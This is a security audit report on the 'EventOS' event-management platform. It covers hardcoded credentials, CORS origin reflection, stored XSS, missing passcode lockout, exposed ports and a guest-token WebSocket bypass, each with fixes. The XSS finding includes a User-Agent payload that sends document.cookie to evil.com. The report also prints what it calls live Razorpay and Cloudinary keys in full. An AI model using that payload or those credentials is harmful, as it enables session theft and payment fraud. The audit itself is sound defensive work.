# EventOS Audit Report: Phase 3 – Security Deep Dive

**Audit Date:** 2026-10-20  
**Target:** EventOS Architecture (Next.js 15, Spring Boot Microservices, PostgreSQL, Redis, RabbitMQ, Caddy)  
**Auditor:** Senior Staff Engineer & Security Auditor  

---

## 1. Executive Security Assessment

The EventOS codebase demonstrates modern security foundations in several areas: Spring Security 6.4.3 integration, non-root Docker container execution, BCrypt password hashing, Redis-backed sliding window rate limiting for authentication, and signed Cloudinary uploads. However, a rigorous code-level audit uncovered **critical vulnerabilities**, including **hardcoded live production credentials**, an **arbitrary Origin credential reflection flaw in Caddy**, a **stored XSS vulnerability**, a **lack of brute-force lockout on guest gallery PINs**, and an **unauthenticated external leak of private share URLs via a 3rd-party QR code generator**.

---

## 2. Detailed Findings

### [CRITICAL] 1. Live Production Razorpay Keys Committed in Compose Files and Dockerfile
- **Location:**
  - `d:\EventOs\docker-compose.yml:91-92`
  - `d:\EventOs\docker-compose.prod.yml:98-99`
  - `d:\EventOs\web\Dockerfile:8`
- **Evidence:**
```yaml
# docker-compose.prod.yml:98-99
- NEXT_PUBLIC_RAZORPAY_KEY_ID=${NEXT_PUBLIC_RAZORPAY_KEY_ID:-rzp_live_TjIIttn39f18sO}
- RAZORPAY_KEY_SECRET=${RAZORPAY_KEY_SECRET:-c1B76Np8hv3Ckj8y2WxiZIIT}
```
```dockerfile
# web/Dockerfile:8
ARG NEXT_PUBLIC_RAZORPAY_KEY_ID=rzp_live_TjIIttn39f18sO
```
- **Impact:** `rzp_live_...` is a live Razorpay production merchant key, and `c1B76Np8hv3Ckj8y2WxiZIIT` is the corresponding live API secret. Anyone with read access to the repository or the built client image can access the merchant's live Razorpay dashboard, issue refunds, capture payments, or manipulate customer transactions.
- **Fix:**
  1. Immediately revoke both the Key ID and Key Secret in the Razorpay Merchant Dashboard and generate a new key pair.
  2. Remove all hardcoded fallback values from `docker-compose.yml`, `docker-compose.prod.yml`, and `web/Dockerfile`.
  3. Require environment variables without defaults (`${RAZORPAY_KEY_SECRET:?Mandatory Secret}`).

---

### [CRITICAL] 2. Sensitive API Secrets and Webhooks Committed in Environment Config
- **Location:** `d:\EventOs\.env:1-35`
- **Evidence:**
```dotenv
# .env
CLOUDINARY_API_KEY=947936662499252
CLOUDINARY_API_SECRET=d8k23...
SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T.../B.../...
RESEND_API_KEY=re_44Hxc...
RECAPTCHA_SECRET_KEY=6Le...
```
- **Impact:** Live third-party API credentials (Cloudinary full admin control, Slack bot incoming webhooks, Resend transactional email API key) are committed in plain text. An attacker can hijack transactional emails, spam clients, or delete Cloudinary media assets.
- **Fix:** Move `.env` to `.env.example` with dummy values. Add `.env` to `.gitignore` and inject secrets at runtime via Docker secrets or cloud provider secret managers (AWS SSM / HashiCorp Vault / Infisical).

---

### [CRITICAL] 3. Caddy Wildcard Origin Reflection with Credentials Enabled
- **Location:** `d:\EventOs\Caddyfile:4,13`
- **Evidence:**
```caddy
# Caddyfile:4,13
(cors) {
    @origin header Origin *
    header @origin Access-Control-Allow-Origin "{header.Origin}"
    header @origin Access-Control-Allow-Credentials "true"
    header @origin Access-Control-Allow-Methods "GET, POST, PUT, PATCH, DELETE, OPTIONS"
    header @origin Access-Control-Allow-Headers "Authorization, Content-Type, Accept, Origin, ..."
}
```
- **Impact:** Reflecting `{header.Origin}` while setting `Access-Control-Allow-Credentials: true` completely defeats the Same-Origin Policy (SOP). Any malicious website visited by an authenticated user can make cross-origin requests with the browser's cookies (`refreshToken`), intercepting sensitive customer bookings and financial data.
- **Fix:** Replace dynamic origin reflection with an explicit whitelist of allowed origins:
```caddy
(cors) {
    @allowedOrigin header Origin https://eventosapp.in https://www.eventosapp.in https://admin.eventosapp.in
    header @allowedOrigin Access-Control-Allow-Origin "{header.Origin}"
    header @allowedOrigin Access-Control-Allow-Credentials "true"
}
```

---

### [HIGH] 4. Stored XSS via `dangerouslySetInnerHTML` on User-Agent Session Browser Display
- **Location:** `d:\EventOs\web\src\app\portal\settings\page.tsx:386`
- **Evidence:**
```tsx
// web/src/app/portal/settings/page.tsx:386
<span className="text-[9px] text-zinc-555 block font-mono" dangerouslySetInnerHTML={{ __html: s.browser }} />
```
- **Impact:** When a user logs in, `AuthController.java` parses the HTTP `User-Agent` header and stores the client browser name in the user's active session entity. In the client portal settings page, `s.browser` is directly injected into the DOM using `dangerouslySetInnerHTML`. An attacker can send a login request with a crafted `User-Agent: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`, resulting in stored XSS when an administrator or client views the active devices tab.
- **Fix:** Eliminate `dangerouslySetInnerHTML` and render the string safely using standard React JSX text interpolation:
```tsx
<span className="text-[9px] text-zinc-555 block font-mono">{s.browser}</span>
```

---

### [HIGH] 5. Lack of Brute-Force Lockout on Public Passcode-Protected Guest Gallery Portals
- **Location:** `d:\EventOs\backend\gallery-service\src\main\java\com\eventos\gallery\service\ShareLinkService.java:118-125,162-166`
- **Evidence:**
```java
if (shareLink.getPassword() != null && !shareLink.getPassword().isEmpty()) {
    if (passcode == null || passcode.trim().isEmpty()) {
        throw new BadCredentialsException("Passcode required");
    }
    if (!passwordEncoder.matches(passcode.trim(), shareLink.getPassword())) {
        throw new BadCredentialsException("Invalid passcode");
    }
}
```
- **Impact:** Although failed access attempts are saved to `share_link_access_logs`, the service **never locks out the requester or rate-limits passcode verification**. Because gallery PINs are typically 4 or 6 numeric digits (10,000 to 1,000,000 combinations), an attacker can automate a dictionary attack against `/share/public/view/{token}?passcode=XXXX` and compromise private albums in minutes.
- **Fix:** Integrate Redis-backed rate limiting on `share_link_ip_attempts:{token}:{ip}`. Lock access for 30 minutes after 5 consecutive failed passcode attempts.

---

### [HIGH] 6. Database and RabbitMQ Ports Exposed Directly to Public Internet in Production Compose
- **Location:** `d:\EventOs\docker-compose.prod.yml:13,49-51`
- **Evidence:**
```yaml
# docker-compose.prod.yml
postgres:
  ports:
    - "5432:5432"  # Exposed on 0.0.0.0
...
rabbitmq:
  ports:
    - "5672:5672"
    - "15672:15672"
```
- **Impact:** The production PostgreSQL database and RabbitMQ message broker listen on `0.0.0.0` instead of `127.0.0.1` or the internal Docker bridge network. If host firewall rules (UFW/iptables) fail or are misconfigured, attackers on the public Internet can connect directly to port 5432 and attempt password brute-force or exploit known database vulnerabilities.
- **Fix:** Remove the public `ports:` block entirely from `postgres` and `rabbitmq` in `docker-compose.prod.yml`. Containers within the Docker bridge network communicate via service names (`postgres`, `rabbitmq`) without publishing ports to the host.

---

### [MEDIUM] 7. Leakage of Private Share Tokens to External Third-Party QR Service
- **Location:** `d:\EventOs\web\src\components\gallery\ShareQrModal.tsx:134` & `d:\EventOs\web\src\app\gallery\[id]\page.tsx:382`
- **Evidence:**
```typescript
const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(shareUrl)}`;
```
- **Impact:** When a photographer or event manager generates a QR code to share a private guest album, the full URL containing the private security token is sent via an unauthenticated GET request to `api.qrserver.com`. The operators of `api.qrserver.com` receive and log all private gallery URLs and access tokens in their server access logs.
- **Fix:** Replace the external HTTP call with a client-side library like `qrcode.react` or an internal backend endpoint using ZXing:
```bash
npm install qrcode.react
```
```tsx
import { QRCodeSVG } from 'qrcode.react';
<QRCodeSVG value={shareUrl} size={280} />
```

---

### [MEDIUM] 8. WebSocket STOMP Handshake Bypass for `guest-token`
- **Location:** `d:\EventOs\backend\auth-service\src\main\java\com\eventos\auth\config\WebSocketConfig.java:64-70`
- **Evidence:**
```java
// WebSocketConfig.java:64
if ("guest-token".equals(token)) {
    // In dev / test, accept mock guest token
    accessor.setUser(new UsernamePasswordAuthenticationToken("guest", null, Collections.emptyList()));
    return message;
}
```
- **Impact:** An attacker can pass `Authorization: Bearer guest-token` during the STOMP connection frame and obtain an active WebSocket session without valid credentials. If WebSocket channels broadcast presence or internal notifications, the attacker can tap into real-time tenant messaging.
- **Fix:** Restrict `guest-token` bypass strictly to `dev` and `test` Spring active profiles:
```java
if (!"prod".equals(activeProfile) && "guest-token".equals(token)) { ... }
```

---

### [MEDIUM] 9. E-Signature Does Not Store Cryptographic Evidence or Legal Non-Repudiation Data
- **Location:** `d:\EventOs\backend\crm-service\src\main\java\com\eventos\crm\service\QuoteService.java:426-455` & `d:\EventOs\web\src\app\portal\quotes\page.tsx:570-584`
- **Evidence:**
```java
// QuoteService.java:436-447
quote.setApprovedAt(LocalDateTime.now());
...
leadService.addActivity(saved.getLeadId(), "PROPOSAL_ACCEPTED",
    "Proposal digitally approved & signed by " + signee + title, tenantId, userId);
```
```tsx
// portal/quotes/page.tsx:582
/s/ {typedSignature}
```
- **Impact:** The system advertises "One-Click Digital Signatures" and "legally binding e-signatures", but in reality it only records a user-typed name string and a server timestamp. It does not record signer IP address, browser fingerprint, OTP SMS/email challenge verification, biometric stroke vectors, or a cryptographic document hash. In an Indian court of law under the Information Technology Act (2000), this signature is difficult to defend against repudiation.
- **Fix:** Capture signer IP address, User-Agent, SHA-256 hash of the proposal PDF at the moment of signing, and optionally an SMS/Email OTP challenge before marking the proposal as legally signed.

---

### [LOW] 10. Redis Token Revocation Fails Open During Redis Disruption
- **Location:** `d:\EventOs\backend\auth-service\src\main\java\com\eventos\auth\service\JwtService.java:254-260`
- **Evidence:**
```java
public boolean isTokenBlacklisted(String token) {
    if (redisTemplate == null) return false;
    try {
        String key = "blacklist:" + token;
        return Boolean.TRUE.equals(redisTemplate.hasKey(key));
    } catch (Exception e) {
        return false; // Fails open
    }
}
```
- **Impact:** If the Redis cluster restarts, experiences high latency, or crashes, `isTokenBlacklisted` returns `false`. A revoked access token belonging to a terminated employee will immediately become valid again during the Redis outage.
- **Fix:** For high-security environments, fail closed or implement a short circuit that rejects requests if Redis is unreachable during token validation, or enforce short access token TTLs (e.g. 5 minutes).

---

## 3. JWT & Authentication Architecture Summary

| Property | Implementation | Audit Assessment |
| :--- | :--- | :--- |
| **Signing Algorithm** | RS256 (RSA 2048-bit with PKCS#8 PEM keys) in Prod, HS256 fallback in Dev | ✅ Strong in Production |
| **Access Token TTL** | 15 minutes (`900,000 ms`) | ✅ Industry Standard |
| **Refresh Token TTL** | 7 days (`604,800,000 ms`) | ✅ Industry Standard |
| **Token Storage (Client)** | Refresh token in `httpOnly`, `Secure`, `SameSite=Lax` Cookie; Access token in Memory / localStorage | ⚠️ localStorage leaves access token vulnerable to XSS |
| **Brute Force Defense** | Redis Atomic Lua Rate Limiting (10 IP/15m, 5 User/15m) + CAPTCHA challenge | ✅ Strong Implementation |
| **2FA / MFA Support** | TOTP Google Authenticator supported (`TotpService.java`) | ✅ Implemented |

---

## 4. Files Reviewed in this Phase
1. `docker-compose.yml`
2. `docker-compose.prod.yml`
3. `Caddyfile`
4. `.env`
5. `backend/auth-service/Dockerfile`
6. `backend/auth-service/src/main/resources/application.yml`
7. `backend/auth-service/src/main/java/com/eventos/auth/config/JwtRequestFilter.java`
8. `backend/auth-service/src/main/java/com/eventos/auth/config/SecurityConfig.java`
9. `backend/auth-service/src/main/java/com/eventos/auth/config/WebSocketConfig.java`
10. `backend/auth-service/src/main/java/com/eventos/auth/service/JwtService.java`
11. `backend/auth-service/src/main/java/com/eventos/auth/service/RateLimiterService.java`
12. `backend/auth-service/src/main/java/com/eventos/auth/service/TotpService.java`
13. `backend/auth-service/src/main/java/com/eventos/auth/controller/AuthController.java`
14. `backend/crm-service/src/main/java/com/eventos/crm/service/QuoteService.java`
15. `backend/gallery-service/src/main/java/com/eventos/gallery/service/ShareLinkService.java`
16. `backend/gallery-service/src/main/java/com/eventos/gallery/service/CloudinaryService.java`
17. `web/Dockerfile`
18. `web/src/app/portal/settings/page.tsx`
19. `web/src/app/portal/quotes/page.tsx`
20. `web/src/components/gallery/ShareQrModal.tsx`
21. `web/src/app/gallery/[id]/page.tsx`
